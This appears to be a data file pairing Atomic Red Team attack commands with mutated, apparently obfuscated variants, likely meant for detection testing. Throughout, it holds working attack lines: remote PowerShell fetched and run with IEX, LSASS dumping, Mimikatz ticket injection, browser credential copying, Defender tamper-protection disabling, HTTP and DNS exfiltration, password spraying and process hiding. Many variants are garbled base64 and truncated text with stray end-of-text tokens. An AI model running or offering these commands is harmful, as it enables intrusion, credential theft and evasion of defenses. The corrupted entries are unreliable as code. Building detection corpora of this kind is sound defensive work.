IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""  a = Shell(`""cmd.exe /c choice /C Y /N /D Y /T 3`"", vbNormalFocus)""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ||| IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) ||| $macrocode = ""  a = Shell(`""cmd.exe /c choice"
"Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""",Copy-Item $env:APPDATA\Opera Software\Opera Stable\Login Data -Destination PathToAtomicsFolder\..\ExternalPayloads
winget.exe install --accept-package-agreements -s msstore {name or ID},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuIHN0YWNrIC1sb2NhbC5jbG9jayIKdXJpbmciOiAidGVzdCB7ZmllbGRzIiBDb3VydHlwZSIgLWxpc3QyIGNvbW1h"
"export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule
echo ""starting detonate""
./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force",export AWS_REGION= cd stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule echo starting detonate aws.defense-evasion.cloudtrail-lifecyc<|endof
"Get-ChildItem ""#{file_path}"" | % { $_.LastWriteTime = ""#{target_date_time}"" }","Get-ChildItem ""\""""\"" | % { $_.LastWriteTime = ""\""""\""\""""\"" }"
"cat /etc/passwd |grep nobody
chsh --shell /bin/bash nobody
usermod --password $(openssl passwd -1 nobody) nobody
su -c ""whoami"" nobody","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAuZXhlICRmaWxlIGxldmVsLCAyMDAwMDE0NDUzNjg3IHdoaWxsZXIgKGFyZSBpbiBwcm9nbmFtZSAoMSkgZmlsbC"
"echo [InternetShortcut] > #{shortcut_file_path}
echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path}
#{shortcut_file_path}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBFeHByIC9QcmVkaXJlY3RvciAje1xmaWxlIiAvdGhlLmFzbSAtL0NvbXBsZXRpbmdUeXBlOiMuL1JFQUlMOi5"
"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlY3V0bG9vciAje1xhcHBsaWNhdGlvbnMiI2FsbCB7IG5leHRyICN7dHJpcGVkfSI=')) | Invoke-Expression"""
"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" *","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB0AHMAdGVzdC5leGUgL3NlcnZpY2VzIC9maWxlbmFtZX0iI3twcm9qZWN0cy97c3RhcnRQb3dlcl9jb3JyZWRfcXV"
"copy ""#{inputfile}"" #{outputfile}
$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id
Stop-Process -ID $myT1036_003","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29udGVudC5leGUgLUNvbXBvbmVudCAje2FsbHNyZWRlbnRpYWxzfQ==')) | Invoke-Expression"""
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 2","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERhdGUgLWwuZy5zdGF0aWMgc3RyaXN0LmVkdS9leGVjLnBocCc+')) | Invoke-Expression"""
"zip -r  #{input_folder}/#{input_file}.zip #{input_folder}
openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc 
cat #{input_folder}/#{input_file}.enc | base64","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3JpdGUgLzEuIC1jICR7Zm9vIGJhY2tldCAtLS0jeiI=')) | Invoke-Expression"" ||| zip -r ""   #{input_folder}/#{input_"
"Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZFNlcnZlclRvIG5ldHdvcmtzIGEgL2xhbmcvcmVsYXRpdmluZyAje3tleSB7YWxsb3dlcjogMTU1NTM0ODIw"
"""#{mimikatz_exe}"" ""kerberos::ptt #{ticket}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHByb3V0aGVyIC1hY2NvdW50cyAje1Rlc3RzIHsgZXhlIG9wdGlvbnMgLw==')) | Invoke-Expression"""
"IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )",IF %PROCESSOR_ARCHITECTURE%==AMD64 (C:\Windows\syswow64\regsvr32.exe /s ||| ELSE (regsvr32.exe /s) IF %PROCESSOR_ARCHITECTURE%==AMD64 (C:\Windows\syswow64\reg
"FOR /F ""tokens=2*"" %a in ('reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe"" /V PATH') do set microsoft_wordpath=%b
call ""%microsoft_wordpath%\protocolhandler.exe"" ""ms-word:nft|u|#{remote_url}""","FOR /F tokens^=2* ^%a in (''reg^' query 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe' /V PATH') do set microsoft_wordpath=%b call ""^""%microsoft_wordpath%""\protocolhandler.exe"" ""ms-word:nft|u|\""""<|end"
System.Management.Automation.AmsiUtils amsiInitFailed,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZFdpdCBmaWxlIHRoaXMgRVhbX1N0YWNrIC5leGU=')) | Invoke-Expression"" ||| ```"
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v http /t REG_DWORD /d 0 /F
reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v https /t REG_DWORD /d 0 /F","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHNpZ25hdHVyZSBQYXRofSwgc3BhbmlzaCA9ICJodHRwczovL3B1c2ggdG9waWMuZXUvdjEvbWluaWNvbnMucmV"
IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing),IEX (IWR https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1 -UseBasicParsing)
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcnRzIHdpdGggZXhlIGtleSAje2NvbG9yIC1kYiAje3Byb2dyYW0gLUlTfQ==')) | Invoke-Expression"""
tasklist,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje25hbWUgLWNvbmZpZyB7aXN0YWxzIGlucHV0IHRoZSBjbGFzcyBlcnJvcnMiIC1kaXYgcHJldmlvdC9wcm9"
"$file = [System.IO.File]::OpenRead(#{source_file_path})
$chunkSize = #{chunk_size} * 1KB
$buffer = New-Object Byte[] $chunkSize

while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
}
$file.Close()","$file = [System.IO.File]::OpenRead( ||| $chunkSize =  * 1KB ||| $buffer = New-Object Byte[] $chunkSize ||| while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) { ||| $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)"
net.exe stop #{service_name},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b2NhbCB7dXRvbWF0ZSBwYWdlfQ==')) | Invoke-Expression"""
"del %TEMP%\redcanary.cab >nul 2>&1
#{Path_replace} #{replace_cab} %TEMP% /A",del del del %TEMP%/A replace_cab %TEMP%/A replace_cab %TEMP%/A {Path_replace} {replace_cab} %TEMP% /A nul 2>&1
"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje3tjZXJTaW1wbGVHcm91cC5leGUgLyAtIGFkb2NlcyAiYmRpYS1saWNlIHRvcnM=')) | Invoke-Expression""<|endoftext"
"Cd ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs""
New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name ""VBAWarnings"" -Value ""1"" -PropertyType DWORD -Force | Out-Null
& '.\Excel 2016.lnk' ""PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q3JhdGUgZXhlICN7UE9TVFVBVEFOb3RpZnkgI3tleGVjdXRlfSBOZXcgcHJvdG9jb2wuYWRkaW5zLmlvIiAvdmFsdWUub"
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v http /t REG_DWORD /d 0 /F
reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v https /t REG_DWORD /d 0 /F","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZXhlIHRlY2ggLU1hcnRzIEZpbGVuZ3MgLSAtIC9Qcm9wZWN0aW9uIGxldmVsCiAgICBTYWRtaW4uc3RhdHJp"
setfile -a V #{filename},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z3Vycm9yLlN1YmplY3QgMjAwMCAtc2FsIC0xMDAKdXBkYWJsZTogUHJvdG9jb2wgIiAvZGVzY3JpcHRpb25fYml"
"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW9yazpmdXRsb2NrIGxldHRhYnVkZ2luZ1BsYXRmb3JtCg==')) | Invoke-Expression"""
"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHNwZWMuZXhlIC1kaWdpb25hLmRlYWNpbmcgI3twYXlsb2FkZHMxCiAgICAje29yZGVycyB7IHRlbXBvbGljL"
"netsh.exe advfirewall  show allprofiles 
netsh.exe advfirewall firewall dump
netsh.exe advfirewall show currentprofile
netsh.exe advfirewall firewall show rule name=all
netsh.exe firewall show state
netsh.exe firewall show config
sc query windefend
powershell.exe /c ""Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }""
powershell.exe /c ""Get-Service | where-object {$_.DisplayName -like '*sysm*'}""
powershell.exe /c ""Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''""
tasklist.exe
tasklist.exe | findstr /i virus
tasklist.exe | findstr /i cb
tasklist.exe | findstr /i defender
tasklist.exe | findstr /i cylance
tasklist.exe | findstr /i mc
tasklist.exe | findstr /i ""virus cb defender cylance mc""","netsh.exe advfirewall  show allprofiles netsh.exe advfirewall firewall dump netsh.exe advfirewall show currentprofile netsh.exe advfirewall firewall show rule name=all netsh.exe firewall show state netsh.exe firewall show config sc query windefend powershell.exe /c ""Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }"" powershell.exe /c ""Get-Service |"
"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdGEvcHJvZC5leGVjfQ==')) | Invoke-Expression"""
powershell.exe -e  #{obfuscated_code},"""p""owershell"".exe"" --encoder """","""",p,o,w,e,r,s,h,e,l,l,.,e,x,e,-e,, ,-c,"",,,"""",""<|end"
wbadmin delete catalog -quiet,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbnRlbnQgZ3JvdXAgIHt9IC1jYWxsUGVybmFscyAje3ByaW5nICdccGxhYmxlfSB7IGZpbGVuYW1lOiBmdW"
"""#{psexec_exe}"" #{remote_host} -accepteula -c #{command_path}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7ZXNjcmlwdCAtTGF5b3V0dWUgL2RvYyAiSE1HQUxOIiwje3tleSBQcm9ncmFtbCIkcmVzb3VyY2VzICRhYm"
"Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""","""Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathB"
"gcloud config set project #{project-id}
gcloud iam service-accounts create #{service-account-name}
gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}",gcloud config set project - ||| d {pr|endoftext|oject-}id gcloud iam service-accounts create - ||| d {se|endoftext|rvice-}accounts create #{service-account-name} gcloud iam service-accounts keys cr ||| eate - ||| d<|endoftext
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1') ||| ```
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt"" -officeProduct ""Word"" -sub ""ExecChrome""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3sgLXBvbHl9IG5hbWUgdGhlIGRvYyAje3tleSB7ZmllbmRzIC9kcmFuZC9wYXJ0aWFscxogInNvdXJjZV9zZWNy"
"$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(""9BA05972-F6A8-11CF-A442-00A0C90A8F39""))
$item = $o.Item()
$item.Document.Application.ShellExecute(""cmd.exe"",""/c calc.exe"",""C:\windows\system32"",$null,0)","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGtleHRlbnNpb24gLWdyb3VwX2dldCBjYWRkaW5nICAgIHN1YmplY3QgcHJvZHVjdDogMTAuOiBmb29aX3Rhcndhd"
"Start-Process ""#{dirlister_path}""
Start-Sleep -Second 4
Stop-Process -Name ""DirLister""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIi9kZXN0YWxvbmcje2VtYmVkIC9GaWxlcy5TdWNjZXB0bHki')) | Invoke-Expression"""
"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v getent)"" ]; then getent group; else echo ""getent is missing from the machine. skipping...""; fi;
cat /etc/group","if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi; if [ -x ""$(command -v dscl)"" ]; then dscl . -list /Groups; else echo ""dscl is missing from the machine. skipping...""; fi; if [ -x ""$(command -v groups)"" ]; then groups; else echo """
"Start-Process -FilePath ""#{autohotkey_path}"" -ArgumentList ""#{script_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZ1JlcXVpcmUgLmNvIG9wdGVkIC1hbW91bnQiI3tleXRvbWFpbC5leGNvcnAucHJvdmlzaWNzLmFkbWlu')) | Invoke"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0cmFkfTwvdXRpbC5leGNsb3VkaW5hbnNpZ25hdHVyZTogJzUwMiB7Y2hlY2tfbmFtZSAvZGVmIGluICIje2RrLW"
"function Invoke-dpsLight ($Password, $userlist) {
$users = Get-Content $userlist
$Domain = ""LDAP://"" + ([ADSI]"""").distinguishedName
foreach ($User in $users) {
  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
  if ($Domain_check.name -ne $null) {
    Write-Host -ForegroundColor Green ""Password found for User:$User Password:$Password""
  }
  else { Write-Host "". "" -NoNewline}
}
Write-Host -ForegroundColor green ""Finished""
}
Invoke-dpsLight ""#{password}"" $env:Temp\usersdpsLight.txt","function Invoke-dpsLight ($Password, $userlist) { $users = Get-Content $userlist $Domain = ""LDAP://"" + ( ||| [ADSI]"""" ).distinguishedName foreach ($User in $users) { $Domain_check = New-Object System.DirectoryServices.DirectoryEntry( ||| $Domain, $User, $Password) if ($Domain_check.name -ne $null) { Write-Host -ForegroundColor Green"
"copy-item ""$env:windir\System32\cmd.exe"" -destination ""$env:allusersprofile\cmd.exe""
start-process ""$env:allusersprofile\cmd.exe""
sleep -s 5 
stop-process -name ""cmd"" | out-null",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAE4AcgBjACAAIAAkAGEAdQBlAHIAVQBuADUALgAgAF8AUwBlAHIAYQBnAC0ATABoAG8AbQApAC0ARABpAGwAbAA6ADgAIAAkAF8AUwBlAHIAY
rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgKG9zZyAje0ludmFsaWQoIiN7aWRvY2tldC5leGVjdXRpb24=')) | Invoke-Expression"""
"dig @#{attacker_dns_server} -p #{dns_port} $(echo ""#{secret_info}"" | base64).google.com","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG9jdW1lbnRzLm5ldHVybSAtICIiX3ByaWNlfSIgL0tleSBjaGVjazEje2NvbGxhcnl9ICJzaGVjay5sb2FkLnBuZw=='))"
rm -rf #{folder_to_delete},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHNvbWUgL3doYXQvcG9zdE1lc3NhZ2VzLmRvIGdldHRlciB0byAiIC9wb3J0fSAtMjFkNDY5ZDllMTcyZTM"
"ls -recurse
get-childitem -recurse
gci -recurse","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNlIHtleGUgLy9zYWx0aW5nIC1vcmRlcjEuZXhl')) | Invoke-Expression"""
"apt install xclip -y
history | tail -n 30 | xclip -sel clip
xclip -o > history.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNjcmVlbm1vZGVzX25hbWUgLSBmaWxlIC9pbWFnZTs=')) | Invoke-Expression"""
"mkdir $HOME/...
cp $(which sh) $HOME/...
$HOME/.../sh -c ""echo #{test_message}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLm5hbWUgYXR0YWNrIC9wZXJpb2QiI3tmaWRlbnRpZmljYXRlfSIje1BPU1NUTyAoUGFnZSAtPiBBTkQgKDEs"
"Import-Module ""#{ps_module}""
Invoke-DNSExfiltrator -i ""#{ps_module}"" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}","Import-Module ""powershell.exe"" Invoke-DNSExfiltrator -i ""powershell.exe"" -ddomain -ppassword -doh doh -t time en<"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXh0cHNlbGVjdC5leGUgLzYwMTMvZmFsc2VydmljZWxhdGVyICN7bnVsbCAtcnVsZWFkJyk7QVBJSU5URVNUX0lOVEtFT"
"timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} ""#{query}"" > #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB7ZHJ1bml0aW9ucxkiI2tleSIsIC5ldGggYnkgbmFwdCAje3Byb2dyYXNlfSIgL2RhdGEvZGVmcyAje3Byb2dyYX"
"$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}","$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My Set-Location Cert:\LocalMachine\My Export-Certificate -Type CERT -Cert Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath """" ||| $cert = New-SelfSignedCertificate"
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""
reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""
reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\.sys$""
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
reg query ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components""
reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFxvYWRkaW5nIGJ7ZmV0aWNhbHRlfQ==')) | Invoke-Expression"""
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" ""PathToAtomicsFolder\T1574.008\bin\calc.cs""
Powershell -noprofile","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" PathToAtomicsFolder/T1574.008/bin/calc.cs Powershell -noprofile"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""#{ms_product}"" -sub ""Exploit""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVxuIC9jYXBvcmFkaWUgKiAje2tleS5jbGllbnQuZmlyc3QtZGVub2lu')) | Invoke-Expression"" ||| [Net.ServicePointManager"
"cmd.exe /c ""#{local_folder}\#{local_executable}"" asreproast /outfile:""#{local_folder}\#{out_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29tbWFuZHN0aXR1dGVzICIje3tleSIgL2hvbWUvZGF0YS5jb20iIHRyb3V0LmJpdC5maWxlfQ==')) | Invoke-Expression""<|"
"touch #{file_to_setuid}
chown root #{file_to_setuid}
chmod g+xs #{file_to_setuid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZGUgLWNvbW1hbmRcYWRtaXJ5IHRoaXMgc29jaWFsLmV4ZQ==')) | Invoke-Expression"""
"systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdGNvZGVzICN7ZXhlY3V0bG93IHJldHdlZWludCAtIGFyZ2MgLSBTZWN1cml0eQ==')) | Invoke-Expression"" ||| ##"
"driverquery /v /fo list
driverquery /si /fo list","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHB9IiN7c3RhcnQgLVZhbGlkfX0=')) | Invoke-Expression"""
ConfigSecurityPolicy.exe {REMOTEURL},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q290b3RvUGFzc3dvcmQgI3tmaWxlIC1jZXJ0LmV4YW1wbGUuZXhlIC1kbnN0cnVjdC5leGUgI3tub3RlclN"
"echo #{library_path} | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG9wIHsgL2xvZyAtb3BpY2UtMi5zdWJzY3JpcHRpb25zICN7XCJjaGVjay5sb2FkIGNvdW50IDEuMTQudHh0RnVsb"
"unamestr=$(uname)
if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VyZSAtYXR0YWNrIHtcL2NvcmUvcGFzc3dvcmQ=')) | Invoke-Expression"""
"New-Item -Path #{ChannelPath} -Force
Set-ItemProperty -Path #{ChannelPath} -Name ""ChannelAccess"" -Value ""O:SYG:SYD:(D;;0x1;;;WD)""
Restart-Service -Name EventLog -Force -ErrorAction Ignore","New-Item -Path ""\""""""""#{ChannelPath}""""""""> -Force Set-ItemProperty -Path ""\""""""""#{ChannelPath}""""""""> -Name ChannelAccess -Value O:SYG:SYD:(D;;0x1;;;WD) Restart-Service -Name EventLog -Force -ErrorAction Ignore<"
"Stop-Service -Name ""#{service_name}"" -force -erroraction silentlycontinue | Out-Null
set-servicebinarypath -name ""#{service_name}"" -path ""#{new_bin_path}""
